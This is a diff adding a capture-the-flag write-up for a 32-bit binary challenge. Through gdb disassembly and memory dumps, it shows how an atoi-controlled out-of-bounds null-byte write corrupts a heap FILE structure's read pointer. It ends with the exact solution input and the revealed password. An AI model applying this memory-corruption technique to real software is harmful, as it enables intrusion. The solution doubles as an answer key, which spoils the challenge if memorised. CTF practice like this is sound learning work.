@@ -1,0 +1,55 @@
+# vim: ts=2 sw=2 et ai
+
+First we want to figure out where the FILE* is going to be, there are two clues:
+
+   0x080485b0 <+53>:	call   0x8048440 <fopen@plt>
+   ..
+   0x080485b8 <+61>:	mov    DWORD PTR [ebp-0x1c],eax
+  if (!fp ...) {...}
+   0x080485cf <+84>:	cmp    DWORD PTR [ebp-0x1c],0x0
+   0x080485d3 <+88>:	je     0x80485da <main+95>
+
+So we can break at *main+61 and look at $eax.
+
+  > p $eax
+  $1 = 0x804b008
+
+  > x $eax
+  x/4 $eax
+  0x804b008:	0xfbad2488	0x00000000	0x00000000	0x00000000
+
+The first 4byte is the MAGIC_HEADER inside the libc library.  The second 4byte
+is the address of the current read pointer.  We want to see how it changes over
+the course of the calls to `fread`.  So we will create three breaks.
+
+  > break *main+122
+  > x/4 0x804b008
+  0x804b008:	0xfbad2488	0x00000000	0x00000000	0x00000000
+
+  > break *main+127
+  > x/4wx
+  0x804b008:	0xfbad2488	0x0804b244	0x0804b30d	0x0804b168
+
+  > break *main+217
+  > x/4wx
+  0x804b008:	0xfbad2488	0x0804b30c	0x0804b30d	0x0804b168
+
+We can see that 0x0804b30c - 0x0804b244 = 200.  Why not 220?  Who knows.  We
+will zero out the last part of this to make the 0x0804b30c become 0x0804b300.
+
+The relevant section of the computation is:
+  0x08048629 <+174>:	call   0x8048460 <atoi@plt>
+  0x0804862e <+179>:	add    esp,0x10
+  0x08048631 <+182>:	mov    BYTE PTR [ebp+eax*1-0x1c0],0x0
+
+
+So we will break at *main+182 and inspect the value of $ebp to see what $eax
+should be.
+  $ebp         = 0xbffffc38
+  $ebp - 0x1c0 = 0xbffffa78
+
+We need to get from 0xbffffa78 to 0x0804b00c, with overflow, that is:
+01208268180
+
+The final Solution is 01208268148 and it renders: 'AveryLoNgPassword!!'
+
